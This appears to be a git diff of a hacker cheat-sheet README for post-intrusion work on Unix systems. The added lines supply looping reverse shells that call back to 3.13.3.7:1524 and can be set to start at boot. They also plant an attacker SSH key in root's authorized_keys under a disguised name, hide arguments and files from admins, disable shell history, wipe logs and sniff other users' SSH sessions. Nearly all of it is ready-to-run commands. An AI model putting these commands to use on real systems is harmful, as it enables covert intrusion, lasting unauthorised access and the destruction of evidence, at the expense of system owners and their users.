@@ -16,6 +16,7 @@ Got tricks? Send them to root@thc.org or submit a pull request.
    1. [Almost invisible SSH](#ais-anchor)
    1. [SSH tunnel OUT](#sto-anchor)
    1. [SSH tunnel IN](#sti-anchor)
+   1. [SSH socks5 OUT](#sso-anchor)
    1. [SSH socks5 IN](#ssi-anchor)
 3. [Network](#network-anchor)
    1. [ARP discover computers on the local network](#adln-anchor)
@@ -39,16 +40,20 @@ Got tricks? Send them to root@thc.org or submit a pull request.
       1. [Upgrade a reverse shell to a pty shell](#rsup-anchor)
       1. [Upgrade a reverse shell to a fully interactive shell](#rsup2-anchor)
       1. [Reverse shell with socat (fully interactive)](#rssc-anchor)
- 6. [Shell Hacks](#sh-anchor)
+ 6. [Backdoors](#bd-anchor)
+    1. [Background reverse shell](#bdrs-anchor)
+    1. [authorized_keys](#bdak-anchor)
+ 7. [Shell Hacks](#sh-anchor)
     1. [Shred files (secure delete)](#shsf-anchor)
     1. [Shred files without *shred*](#shsfwo-anchor)
     1. [Restore the date of a file](#shrdf-anchor)
     1. [Clean logfile](#shcl-anchor)
     1. [Hide files from a User without root priviledges](#shhu-anchor)
- 7. [Crypto](#cr-anchor)
+ 8. [Crypto](#cr-anchor)
     1. [Generate quick random Password](#crgrp-anchor)
     1. [Linux transportable encrypted filesystems](#crltefs-anchor)
- 8. [Miscellaneous](#misc-anchor)
+    1. [Encrypting a file](#cref-anchor)
+ 9. [Miscellaneous](#misc-anchor)
     1. [Sniff a user's SSH session](#sss-anchor)
     1. [Sniff a user's SSH session without root priviledges](#ssswor-anchor)
     1. [How to survive high latency connections](#hlc-anchor)
@@ -59,18 +64,19 @@ Got tricks? Send them to root@thc.org or submit a pull request.
 <a id="lbwh-anchor"></a>
 **1.i. Leave Bash without history:**
 
-Tell Bash that there is no history file (*~/.bash_history*). This is the first command we execute on every shell. It will stop the Bash from logging your commands.
+Tell Bash that there is no history file (*~/.bash_history*). This is the first command we execute on every shell. It will stop the Bash from logging your commands. 
 
 ```
 $ unset HISTFILE
 ```
+Note: *export HISTFILE=/dev/null* as root on some (old) Linux systems causes /dev/null to be chmod'ed to 600...causing all kind of problems).
 
-It is good housekeeping to 'commit suicide' when exiting the shell:
+It is good housekeeping to 'commit suicide' when exiting a shell:
 ```
-$ kill -9 $$
+$ alias exit='kill -9 $$'
 ```
 
-Note: Any command starting with a " " (space) will [not get logged to history](https://unix.stackexchange.com/questions/115917/why-is-bash-not-storing-commands-that-start-with-spaces) either.
+Any command starting with a " " (space) will [not get logged to history](https://unix.stackexchange.com/questions/115917/why-is-bash-not-storing-commands-that-start-with-spaces) either.
 ```
 $  id
 ```
@@ -91,7 +97,13 @@ In this example we execute *nmap* but let it appear with the name *syslogd* in *
 <a id="hya-anchor"></a>
 **1.iii. Hide your arguments**
 
-Continuing from above..FIXME: can this be done witout LD_PRELOAD and just in Bash?
+Download [zap-args.c](src/zap-args.c). This example will execute *nmap* but will make it appear as 'syslogd' without any arguments in the *ps alxww* output.
+
+```
+$ gcc -Wall -O2 -fpic -shared -o zap-args.so zap-args.c -ldl
+$ LD_PRELOAD=./zap-args.so exec -a syslogd nmap -T0 10.0.0.1/24
+```
+Note: There is a gdb variant as well. Anyone?
 
 ---
 <a id="ais-anchor"></a>
@@ -104,11 +116,11 @@ This will not add your user to the */var/log/utmp* file and you wont show up in 
 <a id="sto-anchor"></a>
 **2.ii SSH tunnel OUT**
 
-We use this all the time to circumvent local firewalls or IP filtering:
+We use this all the time to circumvent local firewalls and IP filtering:
 ```
 $ ssh -g -L31337:1.2.3.4:80 user@host.org
 ```
-You or anyone else can now connect to your computer on port 31337 and gets connected to 1.2.3.4:80 and appearing from host 'host.org'
+You or anyone else can now connect to your computer on port 31337 and gets tunneled to 1.2.3.4 port 80 and appearing with the source IP of 'host.org'.
 
 <a id="sti-anchor"></a>
 **2.iii SSH tunnel IN**
@@ -117,18 +129,28 @@ We use this to give access to a friend to an internal machine that is not on the
 ```
 $ ssh -o ExitOnForwardFailure=yes -g -R31338:192.168.0.5:80 user@host.org
 ```
-Anyone connecting to host.org:31338 will get connected to the compuyter 192.168.0.5 on port 80 via your computer.
+Anyone connecting to host.org:31338 will get tunneled to 192.168.0.5 on port 80 via your computer.
+
+<a id="sso-anchor"></a>
+**2.iv SSH socks4/5 OUT**
+
+OpenSSH 7.6 adds support for reverse dynamic forwarding. Example: Tunnel all your browser traffic through your server.
+
+```
+$ ssh -D 1080 user@host.org
+```
+Now configure your browser to use SOCKS with 127.0.0.1:1080. All your traffic is now tunneled through *host.org* and will appear with the source IP of *host.org*.
 
 <a id="ssi-anchor"></a>
 **2.iv SSH socks4/5 IN**
 
-OpenSSH 7.6 adds support for reverse dynamic forwarding. In this mode *ssh* will act as a SOCKS4/5 proxy and forward connections to the destinations requested by the remote SOCKS client.
-
-In this example anyone configuring host.org:1080 as their SOCKS4/5 proxy can connect to any internal computers on any port that are accessible to the system where *ssh* was executed:
+This is the reverse to the above example. It give others access to your *local* network or let others use your compute as a tunnel end-point.
 
 ```
-$ ssh -R 1080 user@host.org
+$ ssh -g -R 1080 user@host.org
 ```
+
+The others configuring host.org:1080 as their SOCKS4/5 proxy. They can now connect to *any* computers on *any port* that your computer has access to. This includes access to computers behind your firewall that are on your local network.
 
 ---
 <a id="network-anchor"></a>
@@ -233,7 +255,7 @@ $ tar cfz - *.png *.c | openssl base64 >stuff.tgz.b64
 ```
 Transfer *stuff.tgz.b64* to the remote system and execute:
 ```
-$ openssl base64 -d | tar xfz -
+$ openssl base64 -d <stuff.tgz.b64 | tar xfz -
 ```
 
 <a id="ftsrl-anchor"></a>
@@ -363,6 +385,12 @@ php -r '$sock=fsockopen("3.13.3.7",1524);exec("/bin/bash -i <&3 >&3 2>&3");'
 Any of the above reverse shells are limited. For example *sudo bash* or *top* will not work. To make these work we have to upgrate the shell to a real PTY shell:
 
 ```
+$ script -qc /bin/bash /dev/null  # Linux
+$ script -q /dev/null /bin/bash   # BSD
+```
+
+Or:
+```
 # Python
 $ python -c 'import pty; pty.spawn("/bin/bash")'
 ```
@@ -403,16 +431,50 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
 ```
 
 ---
+<a id="bd-anchor"></a>
+<a id="bdrs-anchor"></a>
+**6.i. Background reverse shell**
+
+A reverse shell that keeps trying to connect back to us every 3600 seconds (indefinately). Often used until a real backdoor can be deployed and guarantees easy re-entry to a system in case our connection gets disconnected. Add to */etc/rc.local* if required...
+
+```
+$ (while :; do nc -e /bin/bash -vn 3.13.3.7 1524; sleep 3600; done ) &>/dev/null &
+```
+
+Or
+```
+$ screen -d -m /bin/bash -c 'while :; do bash -i 2>&1 >&/dev/tcp/3.13.3.7/1524 0>&1; sleep 3600; done'
+```
+
+<a id="bdak-anchor"></a>
+**6.ii. authorized_keys**
+
+Add your ssh public key to */root/.ssh/authorized_keys*. It's the most reliable backdoor ever :>
+
+* It survives reboots.
+* It even survives re-installs. Admins have been known to make a backup of authorized_keys and then put it straight back onto the newly installed system.
+* We have even seen our key being copied to other companies!
+
+Tip: Change the name at the end of the ssh public keyfile to something obscure like *backup@ubuntu* or the admin's real name:
+```
+$ cat id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCktFkgm40GDkqYwJkNZVb+NLqYoUNSPVPLx0VDbJM0
+[...]
+u1i+MhhnCQxyBZbrWkFWyzEmmHjZdAZCK05FRXYZRI9yadmvo7QKtRmliqABMU9WGy210PTOLMltbt2C
+c3zxLNse/xg0CC16elJpt7IqCFV19AqfHnK4YiXwVJ+M+PyAp/aEAujtHDHp backup@ubuntu
+```
+
+---
 <a id="sh-anchor"></a>
 <a id="shsf-anchor"></a>
-**6.i. Shred & Erase a file**
+**7.i. Shred & Erase a file**
 
 ```
 $ shred -z foobar.txt
 ```
 
 <a id="shsfwo-anchor"></a>
-**6.ii. Shred & Erase without *shred***
+**7.ii. Shred & Erase without *shred***
 ```
 $ FN=foobar.txt; dd bs=1k count="`du -sk \"${FN}\" | cut -f1`" if=/dev/urandom >"${FN}"; rm -f "${FN}"
 ```
@@ -421,7 +483,7 @@ Note: Or deploy your files in */dev/shm* directory so that no data is written to
 Note: Or delete the file and then fill the entire harddrive with /dev/urandom and then rm -rf the dump file.
 
 <a id="shrdf-anchor"></a>
-**6.iii. Restore the date of a file**
+**7.iii. Restore the date of a file**
 
 Let's say you have modified */etc/passwd* but the file date now shows that */etc/passwd* has been modifed. Use *touch* to change the file data to the date of another file (in this example, */etc/shadow*)
 
@@ -430,7 +492,7 @@ $ touch -r /etc/shadow /etc/passwd
 ```
 
 <a id="shcl-anchor"></a>
-**6.iv. Clear logfile**
+**7.iv. Clear logfile**
 
 This will reset the logfile to 0 without having to restart syslogd etc:
 ```
@@ -444,17 +506,36 @@ This will remove any sign of us from the log file:
 ```
 
 <a id="shhu-anchor"></a>
-**6.v. Hide files from that User withour root priviledges**
+**7.v. Hide files from that User without root priviledges**
 
+Our favorite working directory is */dev/shm/*. This location is volatile memory and will be lost on reboot. NO LOGZ == NO CRIME.
+
+Hiding permanent files:
+
+Method 1:
 ```
-alias ls='ls -I SecretDirectory'
+$ alias ls='ls -I system-dev'
 ```
 
-This will hide the directory *SecretDirectory* from the *ls* command. Place in user's *~/.profile*.
+This will hide the directory *system-dev* from the *ls* command. Place in User's *~/.profile* or system wide */etc/profile*.
+
+Method 2:
+Tricks from the 80s. Consider any directory that the admin rarely looks into (like */boot/.X11/..* or so):
+```
+$ mkdir '...'
+$ cd '...'
+```
+
+Method 3:
+Unix allows filenames with about any ASCII character but 0x00. Try tab (*\t*). Happens that most Admins do not know how to cd into any such directory.
+```
+$ mkdir $'\t'
+$ cd $'\t'
+```
 
 <a id="cr-anchor"></a>
 <a id="crgrp-anchor"></a>
-**7.i. Generate quick random Password**
+**8.i. Generate quick random Password**
 
 Good for quick passwords without human element.
 
@@ -463,7 +544,7 @@ $ openssl rand -base64 24
 ```
 
 <a id="crltefs-anchor"></a>
-**7.ii. Linux transportable encrypted filesystems**
+**8.ii. Linux transportable encrypted filesystems**
 
 Create a 256MB large encrypted file system. You will be prompted for a password.
 
@@ -490,17 +571,32 @@ Store data in `/mnt/crypted`, then unmount:
 # losetup -d /dev/loop0
 ```
 
+<a id="misc-anchor"></a>
+**8.iii Encrypting a file**
+
+Encrypt your 0-Days and log files before transfering them - please. (and pick your own password):
+
+Encrypt:
+```
+$ openssl enc -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I <input.txt >input.txt.enc
+```
+
+Decrypt:
+```
+$ openssl enc -d -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I <input.txt.enc >input.txt
+```
+
 ---
 <a id="misc-anchor"></a>
 <a id="sss-anchor"></a>
-**8.i. Sniff a user's SSH session**
+**9.i. Sniff a user's SSH session**
 ```
 $ strace -e trace=read -p <PID> 2>&1 | while read x; do echo "$x" | grep '^read.*= [1-9]$' | cut -f2 -d\"; done
 ```
 Dirty way to monitor a user who is using *ssh* to connect to another host from a computer that you control.
 
 <a id="ssswor-anchor"></a>
-**8.ii. Sniff a user's SSH session without root priviledges**
+**9.ii. Sniff a user's SSH session without root priviledges**
 
 Even dirtier way in case */proc/sys/kernel/yama/ptrace_scope* is set to 1 (strace will fail on already running SSH clients unless uid=0)
 
@@ -535,7 +631,7 @@ $ chmod 755 ~/.local/bin/ssh ~/.local/bin/ssh-log
 The SSH session will be sniffed and logged to *~/.ssh/logs/* the next time the user logs into his shell and uses SSH.
 
 <a id="hlc-anchor"></a>
-**8.iii. How to survive high latency connections**
+**9.iii. How to survive high latency connections**
 
 Hacking over long latency links or slow links can be frustrating. Every keystroke is transmitted one by one and any typo becomes so much more frustrating and time consuming to undo. *rlwrap* comes to the rescue. It buffers all single keystrokes until *Enter* is hit and then transmits the entire line at once. This makes it so much easier to type at high speed, correct typos, ...
 
@@ -548,7 +644,6 @@ Example for *SSH*:
 ```
 $ rlwrap ssh user@host
 ```
-
 
 ---
 Shoutz: ADM, Oscar2020
